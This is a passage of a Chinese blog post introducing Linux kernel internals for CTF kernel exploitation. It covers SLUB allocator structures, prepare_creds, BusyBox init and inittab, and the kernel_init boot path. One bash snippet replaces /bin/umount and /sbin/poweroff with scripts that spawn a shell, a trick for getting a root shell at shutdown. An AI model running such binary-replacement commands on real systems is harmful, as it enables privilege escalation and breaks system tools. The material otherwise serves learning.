CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>kmem_cache_cpu</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>之后将<code>s</code>和<code>flags</code>作为参数，调用了<code>slab_alloc</code>，返回一个指针，这个指针指向申请出来的<code>chunk</code>，返回给用户。</p>
<p><code>slab_alloc</code>中又直接调用了<code>slab_alloc_node</code></p>
<p><strong><code>slab_alloc</code>与<code>slab_alloc_node</code>这两个函数为分配内存的最核心函数</strong>，<code>kmalloc</code>与<code>kmem_cache_alloc</code>是外围函数，<code>kmalloc</code>的参数为<code>size</code>与<code>flags</code>，<code>kmem_cache_alloc</code>的参数为<code>kmem_cache*</code>与<code>flags</code>。</p>
<p><code>kmem_cache_alloc</code>：类似于<code>kmalloc</code>的申请内存的函数，核心在于<code>s</code>，传入的<code>s</code>不同，返回的指针不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *ret = slab_alloc(s, gfpflags, _RET_IP_);     <span class="comment">//传入的s不同slab_alloc返回的指针不同</span></span><br><span class="line"></span><br><span class="line">	trace_kmem_cache_alloc(_RET_IP_, ret, s-&gt;object_size,</span><br><span class="line">				s-&gt;size, gfpflags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmem_cache_alloc);</span><br></pre></td></tr></table></figure>
<p><code>prepare_creds</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);    <span class="comment">//传入cred_jar这个kmem_cache*</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">"prepare_creds() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">	atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure>
<p><img src="https://static.oschina.net/uploads/space/2018/0306/132701_6h0C_2896894.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rm /bin/umount</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">'#!/bin/sh\n/bin/sh'</span> &gt; /bin/umount</span><br><span class="line">chmod +x /bin/umount</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">rm /sbin/poweroff</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">'#!/bin/sh\n/bin/sh'</span> &gt; /sbin/poweroff</span><br><span class="line">chmod +x /sbin/poweroff</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/pengdonglin137/p/3328889.html" target="_blank" rel="noopener">https://www.cnblogs.com/pengdonglin137/p/3328889.html</a></p>
<p>除了基本的命令之外，<code>BusyBox</code>还支持<code>init</code>功能，如同其它的<code>init</code>一样，<code>busybox</code>的<code>init</code>也是完成系统的初始化工作，关机前的工作等等，我们知道在Linux的内核被载入之后，机器就把控制权转交给内核，linux的内核启动之后，做了一些工作，然后找到根文件系统里面的<code>init</code>程序，并执行它，<code>BusyBox</code>的<code>init</code>进程会依次进行以下工作：</p>
<ol>
<li><p>为<code>init</code>设置信号处理过程</p>
</li>
<li><p>初始化控制台</p>
</li>
<li><p>剖析<code>/etc/inittab</code>文件</p>
</li>
<li><p>执行系统初始化命令行，缺省情况下会使用<code>/etc/init.d/rcS</code></p>
</li>
<li><p>执行所有导致<code>init</code>暂停的<code>inittab</code>命令（动作类型：<code>wait</code>）</p>
</li>
<li><p>执行所有仅执行一次的<code>inittab</code>（动作类型：<code>once</code>）</p>
</li>
</ol>
<p>一旦完成以上工作，<code>init</code>进程便会循环执行以下进程：</p>
<ol>
<li><p>执行所有终止时必须重新启动的<code>inittab</code>命令 (动作类型：<code>once</code>）</p>
</li>
<li><p>执行所有终止时必须重新启动但启动前必须询问用户的<code>inittab</code>命令（动作类型：<code>askfirst</code>)</p>
</li>
</ol>
<p>初始化控制台之后，<code>BusyBox</code>会检查<code>/etc/inittab</code>文件是否存在，如果此文件不存在，<code>BusyBox</code>会使用缺省的<code>inittab</code>配置，它主要为系统重引导，系统挂起以及<code>init</code>重启动设置缺省的动作，此外它还会为四个虚拟控制台（<code>tty1</code>到<code>tty4</code>）设置启动<code>shell</code>的动作。如果未建立这些设备文件，<code>BusyBox</code>会报错。</p>
<p>默认的<code>/etc/inittab</code>为：<strong>(放在源码的examples目录下)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/sh</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br><span class="line">tty2::askfirst:/bin/sh</span><br><span class="line">tty3::askfirst:/bin/sh</span><br><span class="line">tty4::askfirst:/bin/sh</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tty: terminal(终端),console(控制台) text terminal</span><br><span class="line">pty: pseudo terminal (ssh,gnome-terminal,konsole,xfce4-terminal,lxterminal) 虚拟终端,常用于远程连接</span><br><span class="line">ptmx: pseudo terminal master x (/dev/ptmx)</span><br><span class="line">pts: pseudo terminal slave (/dev/pts/0)</span><br><span class="line">ptmx与pts合作实现pty,pmtx为主,pts/*为从</span><br><span class="line"></span><br><span class="line">/dev/tty      当前终端</span><br><span class="line">/dev/tty*     控制终端</span><br><span class="line">/dev/ttyS*    串口终端</span><br><span class="line">/dev/ttyUSB*  USB转串口终端</span><br><span class="line">/dev/ptmx     pty主设备</span><br><span class="line">/dev/pts/*    pty从设备</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/luckywang1103/article/details/71191821" target="_blank" rel="noopener">详解/dev/ptmx与/dev/pts/*</a></p>
<p><a href="https://www.shangmayuan.com/a/02016d8bffed4830be2de737.html" target="_blank" rel="noopener">关于/sbin/init的一点东西</a></p>
<p>关于<code>/sbin/mdev</code>：</p>
<p><a href="https://www.cnblogs.com/pied/articles/5775282.html" target="_blank" rel="noopener">https://www.cnblogs.com/pied/articles/5775282.html</a></p>
<blockquote>
<p>简单来说，就是为了创建和管理 /dev 目录下的设备文件，包括初始化对象和动态更新。具体呢，在文件系统被加载时，通过读取内核放在 /sys/class 目录下的设备信息，在 /dev 目录下创建设备文件；在系统运行过程中，通过接收 uevent ，来判断是否需要移出设备文件。</p>
<p>简单来讲，/sys/class 多半负责列出内核支持项目的有无，mdev 则负责维护用户空间中那个可以读写的设备文件。</p>
<p>例如，我们写好了一个字符驱动，然后，我们可以在驱动 init 中使用 class_create() 和 class_device_create() 调用，以实现驱动被加载后，可以出现在 /sys/class 中，进而自动由 mdev 在 /dev 中创建设备节点。当然，我们也可以用 “mknode /dev/xxx c 主设备号 次设备号” 来手动创建，或者，将驱动注册为 MISC device，这样，驱动会出现在 /sys/misc/ 类下面，也会自动加载。</p>
</blockquote>
<p>关于<code>rdinit=/sbin/init</code>：</p>
<p><a href="https://blog.csdn.net/larryliuqing/article/details/8204602" target="_blank" rel="noopener">https://blog.csdn.net/larryliuqing/article/details/8204602</a></p>
<p>命令行未加<code>rdinit=/sbin/init</code>且无<code>/init</code>文件时，启动后报错信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.611972</span>] Kernel panic - <span class="keyword">not</span> syncing: VFS: Unable to mount root fs on unknown-block(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">[    <span class="number">0.632132</span>] CPU: <span class="number">0</span> PID: <span class="number">1</span> Comm: swapper/<span class="number">0</span> Not tainted <span class="number">5.6</span><span class="number">.3</span> #<span class="number">3</span></span><br><span class="line">[    0.643283] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014</span><br><span class="line">[    <span class="number">0.655411</span>] Call Trace:</span><br><span class="line">[    <span class="number">0.657573</span>]  dump_stack+<span class="number">0x6d</span>/<span class="number">0x95</span></span><br><span class="line">[    <span class="number">0.666431</span>]  panic+<span class="number">0xfe</span>/<span class="number">0x2ec</span></span><br><span class="line">[    <span class="number">0.670303</span>]  mount_block_root+<span class="number">0x275</span>/<span class="number">0x325</span></span><br><span class="line">[    <span class="number">0.675738</span>]  mount_root+<span class="number">0x7c</span>/<span class="number">0x7f</span></span><br><span class="line">[    <span class="number">0.688065</span>]  prepare_namespace+<span class="number">0x13f</span>/<span class="number">0x170</span>       <span class="comment">// &lt;== !!!</span></span><br><span class="line">[    <span class="number">0.693402</span>]  kernel_init_freeable+<span class="number">0x243</span>/<span class="number">0x269</span>    <span class="comment">// &lt;== !!!</span></span><br><span class="line">[    <span class="number">0.701961</span>]  ? rest_init+<span class="number">0xb0</span>/<span class="number">0xb0</span></span><br><span class="line">[    <span class="number">0.703674</span>]  kernel_init+<span class="number">0xe</span>/<span class="number">0x110</span></span><br><span class="line">[    <span class="number">0.706105</span>]  ret_from_fork+<span class="number">0x35</span>/<span class="number">0x40</span></span><br><span class="line">[    <span class="number">0.710728</span>] Kernel Offset: <span class="number">0x33e00000</span> from <span class="number">0xffffffff81000000</span> (relocation range: <span class="number">0xffffffff80000000</span><span class="number">-0xffffffffbfffffff</span>)</span><br><span class="line">[    <span class="number">0.729192</span>] Rebooting in <span class="number">1</span> seconds..</span><br></pre></td></tr></table></figure>
<p>可以看到是在<code>kernel_init_freeable</code>中报错的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">ref <span class="title">kernel_init</span><span class="params">(<span class="keyword">void</span> *unused)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	kernel_init_freeable();                     <span class="comment">//    &lt; ==== Here !!!</span></span><br><span class="line">	<span class="comment">/* need to finish all async __init code before freeing the memory */</span></span><br><span class="line">	async_synchronize_full();</span><br><span class="line">	ftrace_free_init_mem();</span><br><span class="line">	free_initmem();</span><br><span class="line">	mark_readonly();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Kernel mappings are now finalized - update the userspace page-table</span></span><br><span class="line"><span class="comment">	 * to finalize PTI.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	pti_finalize();</span><br><span class="line"></span><br><span class="line">	system_state = SYSTEM_RUNNING;</span><br><span class="line">	numa_default_policy();</span><br><span class="line"></span><br><span class="line">	rcu_end_inkernel_boot();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ramdisk_execute_command) &#123;                       <span class="comment">//&lt; ==== important !!!! 运行到这里说明rdinit</span></span><br><span class="line">		ret = run_init_process(ramdisk_execute_command); <span class="comment">//指向存在的文件(若不存在,preapre_namespace中</span></span><br><span class="line">		<span class="keyword">if</span> (!ret)                                        <span class="comment">//会报错),为/init或其他指定的文件,</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;                                   <span class="comment">//因为/sbin/init是busybox中默认存在的用于初始化</span></span><br><span class="line">		pr_err(<span class="string">"Failed to execute %s (error %d)\n"</span>,     <span class="comment">//的文件,所以rdinit一般初始化为/sbin/init.</span></span><br><span class="line">		       ramdisk_execute_command, ret);           <span class="comment">//然后进入busybox中的init流程.</span></span><br><span class="line">	&#125;                                                   <span class="comment">//(运行/etc/init.d/rcS,解析/etc/inittab等操作</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We try each of these until one succeeds.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The Bourne shell can be used instead of init if we are</span></span><br><span class="line"><span class="comment">	 * trying to recover a really broken machine.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">		ret = run_init_process(execute_command);</span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		panic(<span class="string">"Requested init %s failed (error %d)."</span>,</span><br><span class="line">		      execute_command, ret);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!try_to_run_init_process(<span class="string">"/sbin/init"</span>) ||       <span class="comment">// &lt; ==== busybox中默认存在</span></span><br><span class="line">	    !try_to_run_init_process(<span class="string">"/etc/init"</span>) ||        <span class="comment">// &lt; ==== busybox中默认不存在</span></span><br><span class="line">	    !try_to_run_init_process(<span class="string">"/bin/init"</span>) ||        <span class="comment">// &lt; ==== busybox中默认不存在</span></span><br><span class="line">	    !try_to_run_init_process(<span class="string">"/bin/sh"</span>))            <span class="comment">// &lt; ==== 肯定存在,但是若运行到这一步则会直接开启shell,不会进行busybox中的init流程(运行/etc/init.d/rcS,解析/etc/inittab等操作).</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	panic(<span class="string">"No working init found.  Try passing init= option to kernel. "</span></span><br><span class="line">	      <span class="string">"See Linux Documentation/admin-guide/init.rst for guidance."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span> __<span class="function">init <span class="title">kernel_init_freeable</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Wait until kthreadd is all set-up.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	wait_for_completion(&amp;kthreadd_done);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now the scheduler is fully set up and can do blocking allocations */</span></span><br><span class="line">	gfp_allowed_mask = __GFP_BITS_MASK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * init can allocate pages on any node</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_mems_allowed(node_states[N_MEMORY]);</span><br><span class="line"></span><br><span class="line">	cad_pid = task_pid(current);</span><br><span class="line"></span><br><span class="line">	smp_prepare_cpus(setup_max_cpus);</span><br><span class="line"></span><br><span class="line">	workqueue_init();</span><br><span class="line"></span><br><span class="line">	init_mm_internals();</span><br><span class="line"></span><br><span class="line">	do_pre_smp_initcalls();</span><br><span class="line">	lockup_detector_init();</span><br><span class="line"></span><br><span class="line">	smp_init();</span><br><span class="line">	sched_init_smp();</span><br><span class="line"></span><br><span class="line">	page_alloc_init_late();</span><br><span class="line">	<span class="comment">/* Initialize page ext after all struct pages are initialized. */</span></span><br><span class="line">	page_ext_init();</span><br><span class="line"></span><br><span class="line">	do_basic_setup();</span><br><span class="line"></span><br><span class="line">	console_on_rootfs();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * check if there is an early userspace init.  If yes, let it do all</span></span><br><span class="line"><span class="comment">	 * the work</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="comment">//here is the reason why panic.........</span></span><br><span class="line">	<span class="keyword">if</span> (!ramdisk_execute_command)</span><br><span class="line">		ramdisk_execute_command = <span class="string">"/init"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ksys_access((<span class="keyword">const</span> <span class="keyword">char</span> __user *)             <span class="comment">//因为不存在/init,所以会进入prepare_namespace流程</span></span><br><span class="line">			ramdisk_execute_command, <span class="number">0</span>) != <span class="number">0</span>) &#123;      <span class="comment">//去尝试mount root fs没有挂载rootfs.img的文件系统</span></span><br><span class="line">		ramdisk_execute_command = <span class="literal">NULL</span>;              <span class="comment">//所以要么指定好rdinit,要么创建一个/init</span></span><br><span class="line"> 		prepare_namespace();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we have completed the initial bootup, and</span></span><br><span class="line"><span class="comment">	 * we're essentially up and running. Get rid of the</span></span><br><span class="line"><span class="comment">	 * initmem segments and start the user-mode stuff..</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * rootfs is available now, try loading the public keys</span></span><br><span class="line"><span class="comment">	 * and default modules</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	integrity_load_keys();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内存<code>init</code>流程为:</p>
<p><code>kernel_init()</code> =&gt; <code>run_init_process(&#39;/sbin/init or /init&#39;)</code> =&gt; <code>进入busybox中的init_main()</code> ==&gt; <code>解析/etc/inittab</code> </p>
<p>其中<code>buxybox</code>起到上承<code>kernel</code>，下起<code>user</code>的作用。</p>
<p>可以先用下面的代码检测内核编译时是否开启了<code>userfaultfd</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(uffd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:(]userfaultfd syscall close..."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>initrd</code>和<code>initramfs</code>的区别：</p>
<p><a href="https://zhidao.baidu.com/question/1495887129300510619.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1495887129300510619.html</a></p>
<p>资料：</p>
<p><a href="http://staff.ustc.edu.cn/~xlanchen/ULK2011Spring/slides/2_2build+run+gdb linux-2.6.26.pdf" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~xlanchen/ULK2011Spring/slides/2_2build+run+gdb%20linux-2.6.26.pdf</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏还是打残，这是个问题</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://xiaoxiaorenwu.top/2020/04/20/LinuxKernel初识/" title="LinuxKernel初识">https://xiaoxiaorenwu.top/2020/04/20/LinuxKernel初识/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
          
            <a href="/tags/summary/" rel="tag"><i class="fa fa-tag"></i> summary</a>
          
